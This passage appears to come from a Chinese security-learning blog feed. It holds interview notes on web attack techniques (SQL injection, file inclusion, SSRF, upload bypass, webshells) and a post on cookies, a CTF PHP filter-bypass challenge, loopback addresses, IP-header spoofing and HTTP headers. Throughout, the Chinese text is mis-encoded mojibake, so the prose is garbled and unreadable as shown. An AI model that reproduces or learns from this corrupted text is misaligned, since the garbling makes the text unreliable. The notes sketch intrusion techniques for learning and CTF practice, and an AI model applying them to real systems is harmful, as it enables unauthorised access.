<p>æ¯”å¦‚åœ¨mangodbï¼Œå¦‚ä½•åœ¨å…¶ä¸­å®ç°è”åˆæ³¨å…¥ï¼ŒæŠ¥é”™æ³¨å…¥ï¼Œæˆ–è€…ä¸‡èƒ½å¯†ç ä¹‹ç±»çš„<br>sqlServeæœ‰æ²¡æœ‰æ‰“è¿‡ï¼Œsqlseveræ‰§è¡Œå‘½ä»¤<br>MySQL ç‰ˆæœ¬ææƒ<br>æŠ¥é”™æ³¨å…¥å‡½æ•°è‡³å°‘æœ‰4ä¸ªï¼Œé™¤äº†updatexmlï¼Œexecï¼Œè¿˜æœ‰ä¸¤ä¸ªã€‚å¤§æ•°æŠ¥é”™<br>å»¶æ—¶ï¼Œé€ æˆå»¶æ—¶çš„åŸå› ï¼Œä¸€ä¸ªå¯è¯»æ•°æ®å¤ªå¤§ï¼Œ<br>è¿˜æœ‰ä¸ªå‡½æ•°getlogï¼Œ<br>åœ¨ç‰¹æ®Šå­—ç¬¦ååŠ ä¸€äº›ä¸œè¥¿ä¸ä¼šå½±å“æ‰§è¡Œ<br>sqlæŸ¥è¯¢ç»“æœå’ŒæŸ¥è¯¢è¯­å¥ä¸€æ ·ï¼Œè”åˆæŸ¥è¯¢çš„ä¸¤ä¸ªç»“æœè¦ç›¸ç­‰ï¼Œ19å¹´è€ƒè¿‡</p>
<p>æ–‡ä»¶åŒ…å«<br>æœ‰ä¸ªç½‘ç«™ï¼Œæœ‰æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæ€ä¹ˆåˆ©ç”¨<br>é…åˆä¸´æ—¶æ–‡ä»¶ï¼Œæ–‡ä»¶å¾ˆå¤§ï¼Œæš‚æ—¶å­˜<br>nlinux<br>è‡ªåŠ¨unlink</p>
<p>æ–‡ä»¶åéšæœºæ€ä¹ˆåˆ©ç”¨<br>PHPæœ‰ä¸ªç‰ˆæœ¬ï¼Œä¼šå‡ºç°PHPæ–­å¼€ï¼Œè¿™æ ·ä¸ä¼šåˆ é™¤ä¸´æ—¶æ–‡ä»¶ï¼Œè¿™æ ·å¯ä»¥é€šè¿‡çˆ†ç ´å®ç°è¿æ¥æ–‡ä»¶<br>æ¥å—phpinfoé‡‡ç”¨æµå¼è¯»å–ï¼Œå¯ä»¥å»¶æ—¶æ–­å¼€è¿æ¥</p>
<p>sessionåŒ…å«éœ€è¦sessionæ‰“å¼€ï¼Œæ²¡æ‰“å¼€æ€ä¹ˆåŠï¼Œé¡µé¢æ²¡æœ‰session<br>æƒ³åŠæ³•è®©å®ƒäº§ç”Ÿsessionï¼Œ<br>ç»™å®ƒä¸€ä¸ªsession id<br>æœåŠ¡å™¨ä¼šå¯¹åº”ç”Ÿæˆä¸€ä¸ªsessionæ–‡ä»¶ï¼Œ<br>ä½†è¦æƒ³åŠæ³•æ§åˆ¶å†…å®¹</p>
<p>é€šè¿‡ä¸€äº›ä¼ªåè®®å¯ä»¥æ¸…ç©ºæ—¥å¿—æ–‡ä»¶</p>
<p>ssrfæ‰“å†…ç½‘ï¼Œå¯ä»¥æ‰“åˆ°å“ªé‡Œ<br>å¯ä»¥æ‰“MySQLï¼Œ<br>æ€ä¹ˆåˆ¤æ–­ssrfå­˜åœ¨<br>è€ƒè™‘å‡ºç½‘å’Œä¸å‡ºç½‘ä¸¤ç§æƒ…å†µæµ‹è¯•<br>ä¸å‡ºç½‘ä¹Ÿæ²¡å›æ˜¾ï¼Œåˆ©ç”¨å»¶æ—¶ï¼Œæ¯”å¦‚è®¿é—®å†…ç½‘æŸä¸ªä¸å¯èƒ½æœ‰æœåŠ¡çš„ç«¯å£ï¼Œ127.0.0.1:1111</p>
<p>csrfé˜²å¾¡<br>csrfå†™åœ¨postå‚æ•°ä¸­<br>å¤–å¸¦cookieçš„æ–¹å¼</p>
<p>åŸå‹é“¾æ±¡æŸ“<br>è®²è®²åŸç†å°±è¡Œ<br>ä¸ºä»€ä¹ˆè¦åˆå¹¶å¯¹è±¡<br>æ±¡æŸ“envï¼ŒæŠŠé»˜è®¤shellæ±¡æŸ“æˆload</p>
<p>æ–‡ä»¶ä¸Šä¼ <br>&lt;&gt;?æ€ä¹ˆç»•è¿‡<br>PHP5å’ŒPHP7æ€ä¹ˆåŠ<br>apcheaå’ŒPHPå·¥ä½œæ¨¡å¼ï¼Œapchea<br>åˆ©ç”¨Unicodeç¼–ç ï¼Œå’Œå¸¸è§è„šæœ¬utf8æ–‡æœ¬æ ¼å¼ä¸åŒï¼Œåˆ©ç”¨æ£€æµ‹æ˜¯utf8<br>ä¸Šä¼ zipï¼Œæ€ä¹ˆå®ç°è®©å®ƒuzipæ—¶ï¼ŒæŠŠå…¶è·¯å¾„ä¹Ÿæ‰“åŒ…äº†</p>
<p>ååºåˆ—åŒ–åŸç†<br>åˆ©ç”¨å¼•æ“ä¸åŒï¼Œè¯»å…¥å’Œè¯»å‡ºä¸ä¸€æ ·<br>session</p>
<p>æœ€è¿‘å¤ç°cve</p>
<p>åæ¸—é€</p>
<p>linuxææƒ</p>
<p>è¿‡æ»¤äº†&lt;ï¼Ÿ?&gt; apchapeåˆ©ç”¨ .htaccess<br>GIF89?ä½†æ˜¯å…¶ä»–.htaccess</p>
<p>Nginxå’Œapaheè§£æPHPçš„ä¸åŒ</p>
<p>a_a.b.c</p>
<p>ä¿¡æ¯æ”¶é›†è‡ªå·±è§è§£ï¼Œå›½å†…å¤–ç½‘ç«™ä¿¡æ¯æ”¶é›†çš„åŒºåˆ«</p>
<p>æ‹¿ä¸‹æºæœåŠ¡å™¨ï¼Œä½ è§‰å¾—è¿˜æœ‰ä»€ä¹ˆä»·å€¼</p>
<p>æ€ä¹ˆæ‰¹é‡æ‰«æä¸€äº›æ–°çˆ†æ¼æ´</p>
<p>æ€ä¹ˆè¿‡æ»¤ä¸€ä¸‹æ”¶é›†ä¿¡æ¯ï¼Œæ¯”å¦‚ç‰¹å®šIP</p>
<p>æ–°çˆ†æ¼æ´ï¼Œè¡¥ä¸æœ‰ä»€ä¹ˆä»·å€¼</p>
<p>ç»™ä½ 0dayçš„expï¼Œä½ æ€ä¹ˆç¡®è®¤èµ„äº§é‡Œæœ‰æ²¡æœ‰0day</p>
<p>å†…å­˜dumpä¸‹æ¥æœ‰ä»€ä¹ˆç”¨ï¼Œæ¯”å¦‚å›½èµ›reading</p>
<p>springbootæœ‰ç»ƒè¿‡æ‰‹ï¼Œä¸€äº›MySQLé…ç½®å­˜åœ¨å“ªäº›é…ç½®</p>
<p>æ‹¿åˆ°webshellçš„æœåŠ¡å™¨ï¼Œä½ åªèƒ½çœ‹åˆ°é˜²ç«å¢™IPï¼Œæ€ä¹ˆè·å–å…·ä½“IPï¼Œï¼Œç”¨dnslog</p>
<p>äº†è§£è¿‡èœœç½å—ï¼Œ</p>
<p>å†…ç½‘åŸŸæ§</p>
<p>éšä¾¿è¯´ç‚¹å°è±¡æ·±åˆ»çš„é¢˜</p>
</blockquote>
]]></content>
      <categories>
        <category>Work</category>
      </categories>
      <tags>
        <tag>Work</tag>
      </tags>
  </entry>
  <entry>
    <title>webåŸºç¡€éšè®°</title>
    <url>//post/Noteless/</url>
    <content><![CDATA[<p><code>éšä¾¿è®°ä¸€ä¸‹ï¼Œå¤§éƒ½å¸¸æ··æ·†æˆ–è€…æ˜“å¿˜åŸºç¡€çŸ¥è¯†</code></p>
<span id="more"></span>

<h1 id="ç½‘ç«™è¿æ¥é‡ç½®ï¼Œç”¨æ¸…ç©ºç¼“å­˜å’ŒCookieè§£å†³"><a href="#ç½‘ç«™è¿æ¥é‡ç½®ï¼Œç”¨æ¸…ç©ºç¼“å­˜å’ŒCookieè§£å†³" class="headerlink" title="ç½‘ç«™è¿æ¥é‡ç½®ï¼Œç”¨æ¸…ç©ºç¼“å­˜å’ŒCookieè§£å†³"></a>ç½‘ç«™è¿æ¥é‡ç½®ï¼Œç”¨æ¸…ç©ºç¼“å­˜å’Œ<u><strong>Cookie</strong></u>è§£å†³</h1><p>ä»Šå¤©åœ¨æ‰“buuctfé¶åœºçš„æ—¶å€™é‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å½“é¡µé¢è·³è½¬æ—¶ï¼Œä¼šæ˜¾ç¤ºè¿æ¥é‡ç½®ï¼Œå¯¼è‡´æˆ‘çš„sqlæ³¨å…¥ç»“æœä¸èƒ½æ˜¾ç¤ºï¼Œç„¶åç™¾åº¦äº†ä¸€ä¸‹ï¼Œå‘ç°å¯èƒ½æ˜¯æµè§ˆå™¨ç¼“å­˜å¤ªå¤šå¯¼è‡´çš„ï¼Œäºæ˜¯æˆ‘æŠŠæµè§ˆå™¨çš„ç¼“å­˜å’Œcookieä¸€åŒå…¨éƒ¨æ¸…ç©ºï¼Œç„¶åæˆ‘å†åˆ·æ–°sql æ³¨å…¥é‚£é“é¢˜çš„ç•Œé¢ï¼Œè§£å†³äº†ï¼Œæ²¡æœ‰å†æ˜¾ç¤ºè¿æ¥é‡ç½®ï¼Œä¹Ÿæ˜¾ç¤ºäº†æˆ‘çš„æ³¨å…¥ç»“æœï¼Œæˆ‘æ­£è¦äº¤flagçš„æ—¶å€™ï¼Œç„¶åï¼Œæˆ‘å‘ç°â€¦..ï¼Œæˆ‘çš„buuctfè´¦å·ä¸‹çº¿ï¼Œæˆ‘çš„csdnè´¦å·ä¹Ÿä¸‹çº¿äº†</p>
<p>cookieçš„ä½œç”¨å’Œé‡è¦æ€§å°±å‡ºæ¥äº†ï¼Œä»è¿™ä¸ªäº‹æƒ…çœ‹å‡ºï¼Œcookieæ˜¯å½“æˆ‘ä»¬ç™»å½•ç½‘ç«™çš„ä¸»è¦èº«ä»½å‡­è¯ï¼Œå½“æˆ‘åˆ é™¤cookieåï¼Œæˆ‘æ— æ³•è¯æ˜è‡ªå·±èº«ä»½æ—¶ï¼Œå³ç½‘ç«™å½“å‰æµè§ˆå™¨æ— è¯¥è´¦å·å½“å‰åœ¨è¯¥ç½‘ç«™çš„cookieæ—¶ï¼Œç½‘ç«™å°±ä¼šå¼ºåˆ¶ä¸‹çº¿æˆ‘çš„è´¦å·</p>
<p>ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬åœ¨ç™»å½•ç½‘ç«™æ—¶ï¼ˆæ²¡æœ‰é€€å‡ºï¼‰ï¼Œç‚¹å‡»äº†å…¶ä»–é“¾æ¥å¯¼è‡´è‡ªå·±åœ¨è¯¥æµè§ˆå™¨çš„è¯¥ç½‘ç«™çš„cookieå¤–æ³„ï¼Œè¢«æœ‰å¿ƒäººè·å–ï¼Œé‚£ä¹ˆæ‹¥æœ‰ä½ çš„cookieçš„äººï¼Œå°±å¯ä»¥ç™»å½•ä½ çš„è´¦å·ï¼Œåœ¨ä½ ç™»å½•çš„ç½‘ç«™ä¸Šè¿›è¡Œä¿®æ”¹å¯†ç ï¼Œåˆ é™¤æ–‡ç« ï¼Œç”šè‡³å¯ä»¥è½¬è´¦ç­‰ç­‰</p>
<p>æ‰€ä»¥ä»¥åç™»å½•äº†ä¸€äº›é‡è¦ç½‘ç«™æ—¶ï¼Œæ¯”å¦‚æ”¯ä»˜å®ï¼Œæ·˜å®ï¼Œåšå®¢ç½‘ç«™æ—¶ï¼Œåˆ«éšä¾¿ç‚¹å‡»é“¾æ¥ï¼Œä¿è¯è‡ªå·±çš„ä¿¡æ¯å®‰å…¨ï¼Œä¸è¦é»‘å®¢è¢«é»‘å®¢é»‘äº†ï¼Œé‚£ç¡®å®æœ‰ç‚¹éš¾ä¸ºæƒ…äº†</p>
<blockquote>
<p><code>Cookieå®é™…ä¸Šæ˜¯ä¸€å°æ®µçš„æ–‡æœ¬ä¿¡æ¯ã€‚å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡å™¨ï¼Œå¦‚æœæœåŠ¡å™¨éœ€è¦è®°å½•è¯¥ç”¨æˆ·çŠ¶æ€ï¼Œå°±ä½¿ç”¨responseå‘å®¢æˆ·ç«¯æµè§ˆå™¨é¢å‘ä¸€ä¸ªCookieã€‚å®¢æˆ·ç«¯æµè§ˆå™¨ä¼šæŠŠCookieä¿å­˜èµ·æ¥ã€‚å½“æµè§ˆå™¨å†è¯·æ±‚è¯¥ç½‘ç«™æ—¶ï¼Œæµè§ˆå™¨æŠŠè¯·æ±‚çš„ç½‘å€è¿åŒè¯¥Cookieä¸€åŒæäº¤ç»™æœåŠ¡å™¨ã€‚æœåŠ¡å™¨æ£€æŸ¥è¯¥Cookieï¼Œä»¥æ­¤æ¥è¾¨è®¤ç”¨æˆ·çŠ¶æ€ã€‚æœåŠ¡å™¨è¿˜å¯ä»¥æ ¹æ®éœ€è¦ä¿®æ”¹Cookieçš„å†…å®¹</code></p>
</blockquote>
<h1 id="gitå‘½ä»¤"><a href="#gitå‘½ä»¤" class="headerlink" title="gitå‘½ä»¤"></a>gitå‘½ä»¤</h1><p>ä½¿ç”¨<code>githack</code>ï¼Œè®°å½•ä¸€äº›å‘½ä»¤</p>
<p><img src="/post/Noteless/image-20220729114811362.png" alt="image-20220729114811362"></p>
<h1 id="éšæ‰‹è®°å½•é¢˜ç›®"><a href="#éšæ‰‹è®°å½•é¢˜ç›®" class="headerlink" title="éšæ‰‹è®°å½•é¢˜ç›®"></a>éšæ‰‹è®°å½•é¢˜ç›®</h1><h2 id="å¤´ç–¼çš„phpä»£ç å®¡è®¡"><a href="#å¤´ç–¼çš„phpä»£ç å®¡è®¡" class="headerlink" title="å¤´ç–¼çš„phpä»£ç å®¡è®¡"></a>å¤´ç–¼çš„<code>php</code>ä»£ç å®¡è®¡</h2><p>ç¬¬ä¸€çœ¼å¾ˆå¤´ç–¼çš„<code>php</code>ä»£ç å®¡è®¡ï¼Œä½†çœ‹ç€å´æ²¡æœ‰ä»€ä¹ˆå¤ªå¤§çš„è€ƒç‚¹ï¼Œè¿™é‡Œæˆ‘æ²¡æœ‰é¢˜ç›®ï¼Œå°±åœ¨æœ¬åœ°è¯•è¯•èƒ½ä¸èƒ½ç»•è¿‡æ‰€æœ‰çš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// code by SEC@USTC </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;charset&quot; content=&quot;gbk&quot;&gt;&lt;/head&gt;&lt;body&gt;&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="variable">$URL</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]; </span><br><span class="line"><span class="comment">//echo &#x27;URL: &#x27;.$URL.&#x27;&lt;br/&gt;&#x27;; </span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;CTF&#123;???&#125;&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$flag</span>, <span class="string">&#x27;CTF&#123;???&#125;&#x27;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./index.php&#x27;</span>)); </span><br><span class="line"><span class="variable">$stop</span> = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$URL</span>, <span class="string">&#x27;./&#x27;</span>) !== <span class="literal">FALSE</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">1</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$URL</span>, <span class="string">&#x27;\\&#x27;</span>) !== <span class="literal">FALSE</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">2</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$matches</span> = <span class="keyword">array</span>(); </span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([0-9a-z\/.]+)$/&#x27;</span>, <span class="variable">$URL</span>, <span class="variable">$matches</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$matches</span>) || <span class="variable">$matches</span>[<span class="number">1</span>] != <span class="variable">$URL</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">3</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$URL</span>, <span class="string">&#x27;//&#x27;</span>) !== <span class="literal">FALSE</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">4</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$URL</span>, -<span class="number">10</span>) !== <span class="string">&#x27;/index.php&#x27;</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">5</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$URL</span>, <span class="string">&#x27;p.&#x27;</span>) !== <span class="literal">FALSE</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">6</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="variable">$URL</span> == <span class="string">&#x27;/fan/index.php&#x27;</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">7</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$stop</span>) <span class="variable">$stop</span> = <span class="number">8</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr /&gt;&#x27;</span>; </span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="variable">$stop</span>; <span class="variable">$i</span>++) </span><br><span class="line">    <span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;//Pass &#x27;</span>.<span class="variable">$i</span>, <span class="string">&#x27;//Pass&#x27;</span>, <span class="variable">$code</span>); </span><br><span class="line"><span class="keyword">for</span>(; <span class="variable">$i</span> &lt; <span class="number">8</span>; <span class="variable">$i</span>++) </span><br><span class="line">    <span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;//Pass &#x27;</span>.<span class="variable">$i</span>, <span class="string">&#x27;//Not Pass&#x27;</span>, <span class="variable">$code</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">highlight_string</span>(<span class="variable">$code</span>, <span class="literal">TRUE</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/body&gt;&lt;/html&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="æœ¬åœ°å›ç¯"><a href="#æœ¬åœ°å›ç¯" class="headerlink" title="æœ¬åœ°å›ç¯"></a>æœ¬åœ°å›ç¯</h1><blockquote>
<p>æœ¬åœ°å›ç¯åœ°å€ï¼ˆ<code>Loop back address</code>ï¼‰ï¼Œä¸å±äºä»»ä½•ä¸€ä¸ªæœ‰ç±»åˆ«åœ°å€ç±»ã€‚å®ƒä»£è¡¨è®¾å¤‡çš„æœ¬åœ°è™šæ‹Ÿæ¥å£ï¼Œæ‰€ä»¥é»˜è®¤è¢«çœ‹ä½œæ˜¯æ°¸è¿œä¸ä¼šå®•æ‰çš„æ¥å£ã€‚</p>
<p>ä¸»è¦ä½œç”¨æœ‰ä¸¤ä¸ªï¼šä¸€æ˜¯æµ‹è¯•æœ¬æœºçš„ç½‘ç»œé…ç½®ï¼Œèƒ½PINGé€š<code>127.0.0.1</code>è¯´æ˜æœ¬æœºçš„ç½‘å¡å’Œ<code>IP</code>åè®®å®‰è£…éƒ½æ²¡æœ‰é—®é¢˜ï¼›å¦ä¸€ä¸ªä½œç”¨æ˜¯æŸäº›<code>SERVER/CLIENT</code>çš„åº”ç”¨ç¨‹åºåœ¨è¿è¡Œæ—¶éœ€è°ƒç”¨æœåŠ¡å™¨ä¸Šçš„èµ„æºï¼Œä¸€èˆ¬è¦æŒ‡å®š<code>SERVER</code>çš„<code>IP</code>åœ°å€ï¼Œä½†å½“è¯¥ç¨‹åºè¦åœ¨åŒä¸€å°æœºå™¨ä¸Šè¿è¡Œè€Œæ²¡æœ‰åˆ«çš„<code>SERVER</code>æ—¶å°±å¯ä»¥æŠŠSERVERçš„èµ„æºè£…åœ¨æœ¬æœºï¼Œ<code>SERVER</code>çš„<code>IP</code>åœ°å€è®¾ä¸º<code>127.0.0.1</code>åŒæ ·ä¹Ÿå¯ä»¥è¿è¡Œã€‚</p>
<p><strong>æœ¬åœ°å›ç¯åœ°å€æŒ‡çš„æ˜¯ä»¥<code>127</code>å¼€å¤´çš„åœ°å€ï¼ˆ<code>127.0.0.1 - 127.255.255.254</code>ï¼‰ï¼Œé€šå¸¸ç”¨<code>127.0.0.1</code>æ¥è¡¨ç¤º</strong></p>
<p>ä½†æ˜¯ï¼Œä½¿ç”¨<code>127.0.0.1/8</code>å†…çš„ä¸åŒåœ°å€ï¼Œå°±å¯ä»¥åœ¨æœ¬æœºä¸Šè®¾ç½®ä¾¦å¬ç›¸åŒç«¯å£çš„å¤šä¸ªæœåŠ¡å™¨</p>
</blockquote>
<h1 id="client-ipå’ŒX-Forwarded-Forå’Œ"><a href="#client-ipå’ŒX-Forwarded-Forå’Œ" class="headerlink" title="client-ipå’ŒX-Forwarded-Forå’Œ"></a><code>client-ip</code>å’Œ<code>X-Forwarded-For</code>å’Œ</h1><blockquote>
<p>1ï¼‰<code>client-ip</code>ï¼šå®¢æˆ·ç«¯ipï¼Œç›¸è¾ƒäºX-Forwarded-Forï¼Œå®ƒåªæœ‰ä¸€ä¸ªipä¹Ÿå°±æ˜¯çœŸå®ipï¼Œå½“ä¸èƒ½ä¼ªé€ XFFå¤´çš„æ—¶å€™ï¼Œå°±å¯ä»¥ç”¨client-ipä»£æ›¿ï¼Œç›´æ¥æŒ‡æ˜ä¼ªé€ ip</p>
<p>2ï¼‰<code>X-Forwarded-For</code>:ç®€ç§°XFFå¤´ï¼Œå®ƒä»£è¡¨å®¢æˆ·ç«¯ï¼Œä¹Ÿå°±æ˜¯HTTPçš„è¯·æ±‚ç«¯çœŸå®çš„IPï¼Œåªæœ‰åœ¨é€šè¿‡äº†HTTP  ä»£ç†æˆ–è€…è´Ÿè½½å‡è¡¡æœåŠ¡å™¨æ—¶æ‰ä¼šæ·»åŠ è¯¥é¡¹ã€‚xffæ˜¯httpçš„æ‹“å±•å¤´éƒ¨ï¼Œä½œç”¨æ˜¯ä½¿WebæœåŠ¡å™¨è·å–è®¿é—®ç”¨æˆ·çš„IPçœŸå®åœ°å€ï¼ˆå¯ä¼ªé€ ï¼‰ã€‚ç”±äºå¾ˆå¤šç”¨æˆ·é€šè¿‡ä»£ç†æœåŠ¡å™¨è¿›è¡Œè®¿é—®ï¼ŒæœåŠ¡å™¨åªèƒ½è·å–ä»£ç†æœåŠ¡å™¨çš„IPåœ°å€ï¼Œè€Œxffçš„ä½œç”¨åœ¨äºè®°å½•ç”¨æˆ·çš„çœŸå®IPï¼Œä»¥åŠä»£ç†æœåŠ¡å™¨çš„IPã€‚æ ¼å¼ä¸ºï¼šX-Forwarded-For: æœ¬æœºIP, ä»£ç†1IP, ä»£ç†2IP, ä»£ç†2IP</p>
</blockquote>
<h1 id="è¯·æ±‚å¤´ã€å“åº”å¤´å…¨éƒ¨å†…å®¹"><a href="#è¯·æ±‚å¤´ã€å“åº”å¤´å…¨éƒ¨å†…å®¹" class="headerlink" title="è¯·æ±‚å¤´ã€å“åº”å¤´å…¨éƒ¨å†…å®¹"></a>è¯·æ±‚å¤´ã€å“åº”å¤´å…¨éƒ¨å†…å®¹</h1><h2 id="HTTPè¯·æ±‚å¤´"><a href="#HTTPè¯·æ±‚å¤´" class="headerlink" title="HTTPè¯·æ±‚å¤´"></a>HTTPè¯·æ±‚å¤´</h2><blockquote>
<p>Acceptï¼šæµè§ˆå™¨å¯æ¥å—çš„MIMEç±»å‹ã€‚</p>
<p>Accept-Charsetï¼šæµè§ˆå™¨å¯æ¥å—çš„å­—ç¬¦é›†ã€‚</p>
<p>Accept-Encodingï¼šæµè§ˆå™¨èƒ½å¤Ÿè¿›è¡Œè§£ç çš„æ•°æ®ç¼–ç æ–¹å¼ï¼Œæ¯”å¦‚gzipã€‚Servletèƒ½å¤Ÿå‘æ”¯æŒgzipçš„æµè§ˆå™¨è¿”å›ç»gzipç¼–ç çš„HTMLé¡µé¢ã€‚è®¸å¤šæƒ…å½¢ä¸‹è¿™å¯ä»¥å‡å°‘5åˆ°10å€çš„ä¸‹è½½æ—¶é—´ã€‚</p>
<p>Accept-Languageï¼šæµè§ˆå™¨æ‰€å¸Œæœ›çš„è¯­è¨€ç§ç±»ï¼Œå½“æœåŠ¡å™¨èƒ½å¤Ÿæä¾›ä¸€ç§ä»¥ä¸Šçš„è¯­è¨€ç‰ˆæœ¬æ—¶è¦ç”¨åˆ°ã€‚</p>
<p><code>Authorization</code>ï¼šæˆæƒä¿¡æ¯ï¼Œé€šå¸¸å‡ºç°åœ¨å¯¹æœåŠ¡å™¨å‘é€çš„WWW-Authenticateå¤´çš„åº”ç­”ä¸­ã€‚</p>
<p>Connectionï¼šè¡¨ç¤ºæ˜¯å¦éœ€è¦æŒä¹…è¿æ¥ã€‚å¦‚æœServletçœ‹åˆ°è¿™é‡Œçš„å€¼ä¸ºâ€œKeep-Aliveâ€ï¼Œæˆ–è€…çœ‹åˆ°è¯·æ±‚ä½¿ç”¨çš„æ˜¯HTTP 1.1ï¼ˆHTTP 1.1é»˜è®¤è¿›è¡ŒæŒä¹…è¿æ¥ï¼‰ï¼Œå®ƒå°±å¯ä»¥åˆ©ç”¨æŒä¹…è¿æ¥çš„ä¼˜ç‚¹ï¼Œå½“é¡µé¢åŒ…å«å¤šä¸ªå…ƒç´ æ—¶ï¼ˆä¾‹å¦‚Appletï¼Œå›¾ç‰‡ï¼‰ï¼Œæ˜¾è‘—åœ°å‡å°‘ä¸‹è½½æ‰€éœ€è¦çš„æ—¶é—´ã€‚è¦å®ç°è¿™ä¸€ç‚¹ï¼ŒServletéœ€è¦åœ¨åº”ç­”ä¸­å‘é€ä¸€ä¸ªContent-Lengthå¤´ï¼Œæœ€ç®€å•çš„å®ç°æ–¹æ³•æ˜¯ï¼šå…ˆæŠŠå†…å®¹å†™å…¥ByteArrayOutputStreamï¼Œç„¶ååœ¨æ­£å¼å†™å‡ºå†…å®¹ä¹‹å‰è®¡ç®—å®ƒçš„å¤§å°ã€‚</p>
<p>Content-Lengthï¼šè¡¨ç¤ºè¯·æ±‚æ¶ˆæ¯æ­£æ–‡çš„é•¿åº¦ã€‚</p>
<p><code>Cookie</code>ï¼šè¿™æ˜¯æœ€é‡è¦çš„è¯·æ±‚å¤´ä¿¡æ¯ä¹‹ä¸€</p>
<p>Fromï¼šè¯·æ±‚å‘é€è€…çš„emailåœ°å€ï¼Œç”±ä¸€äº›ç‰¹æ®Šçš„Webå®¢æˆ·ç¨‹åºä½¿ç”¨ï¼Œæµè§ˆå™¨ä¸ä¼šç”¨åˆ°å®ƒã€‚</p>
<p><code>Host</code>ï¼šåˆå§‹URLä¸­çš„ä¸»æœºå’Œç«¯å£ã€‚</p>
<p>If-Modified-Sinceï¼šåªæœ‰å½“æ‰€è¯·æ±‚çš„å†…å®¹åœ¨æŒ‡å®šçš„æ—¥æœŸä¹‹ååˆç»è¿‡ä¿®æ”¹æ‰è¿”å›å®ƒï¼Œå¦åˆ™è¿”å›304â€œNot Modifiedâ€åº”ç­”ã€‚</p>
<p>Pragmaï¼šæŒ‡å®šâ€œno-cacheâ€å€¼è¡¨ç¤ºæœåŠ¡å™¨å¿…é¡»è¿”å›ä¸€ä¸ªåˆ·æ–°åçš„æ–‡æ¡£ï¼Œå³ä½¿å®ƒæ˜¯ä»£ç†æœåŠ¡å™¨è€Œä¸”å·²ç»æœ‰äº†é¡µé¢çš„æœ¬åœ°æ‹·è´ã€‚</p>
